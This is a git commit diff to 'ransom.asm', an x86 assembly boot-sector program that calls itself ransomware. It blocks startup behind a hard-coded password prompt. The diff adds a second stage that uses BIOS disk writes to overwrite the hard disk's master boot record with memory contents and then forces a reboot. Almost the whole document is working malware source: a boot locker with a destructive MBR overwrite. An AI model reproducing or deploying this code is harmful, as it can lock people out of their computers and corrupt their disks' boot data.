28dd02c3a04c0fff274b89c05cbf6dd137f90314
Davi Santana <144629099+DaviGSantana@users.noreply.github.com>
2025-08-10 10:23:30 -0300

    Code ransom.asm

--- ransom.asm
+++ ransom.asm
@@ -44,7 +44,7 @@ int 0x16
 
 ;lemos
 
-;vamos mostrar na tela o que o usuário pressionou no teclado
+;mostrar na tela o que o usuário pressionou no teclado
 
 mov ah, 0x0e
 xor bx, bx
@@ -70,7 +70,8 @@ xor dx, dx
 mov dh, 0x04
 mov bp, mensagemParabens + 0x7c00
 int 0x10
-jmp fim
+jmp lerSetoresMemoria
+
 
 
 
@@ -93,16 +94,46 @@ fim:
 jmp $
 
 
+lerSetoresMemoria:
+mov ah, 0x02
+mov al, 0x02
+mov ch, 0x00
+mov cl, 0x02
+mov dh, 0x00
+mov dl, 0x80
+mov bx, stage2 + 0x7c00
+int 0x13
+
+jmp stage2
 
 
-mensagem: db 'Nao permitirei ligar o computador enquanto nao me pagar!', 0x0a, 0x0d, 'Se ja pagou, digite a senha aqui: ', 0x00
+
+
+mensagem: db 'Ransomware active! The machine will only start when the correct password is entered. ', 0x0a, 0x0d, 'key: ', 0x00
 tamanhoMensagem: db ($ - mensagem)
-mensagemErro: db 'Voce errou! Por isso nao passara!', 0x00
+mensagemErro: db 'Wrong password, access denied!', 0x00
 tamanhoMensagemErro: db ($ - mensagemErro)
-mensagemParabens: db 'Muito bom! Voce passou! =D', 0x00
+mensagemParabens: db 'Correct password!', 0x00
 tamanhoMensagemParabens: db ($ - mensagemParabens)
 senha: db 'Davi!'
 tamanhoSenha: dw ($ - senha)
 
 times 510 - ($ - $$) db 0x00
 dw 0xAA55
+
+
+
+
+stage2:
+mov ah, 3
+mov al, 1
+mov ch, 0
+mov cl, 1
+mov dh, 0
+mov dl, 0x80
+mov bx, 0x8000
+int 0x13
+
+jmp 0xffff:0000
+
+times 1024 - ($ - $$) db 0x00
